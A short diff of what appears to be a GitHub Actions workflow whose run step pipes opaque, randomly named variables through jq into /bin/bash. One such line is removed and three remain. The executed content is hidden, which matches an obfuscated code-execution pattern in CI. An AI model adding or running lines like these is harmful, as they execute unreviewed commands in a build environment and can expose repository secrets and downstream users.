@@ -23,7 +23,6 @@ jobs:
           echo $xpblo10 | jq -r .g669 | /bin/bash
           printf '%s' "$bbwnd10" | jq -r .ayg3283 | /bin/bash
           echo $dmr92217 | jq -r .u939 | /bin/bash
-          printf '%s' "$lmbvg24" | jq -r .okxw900 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
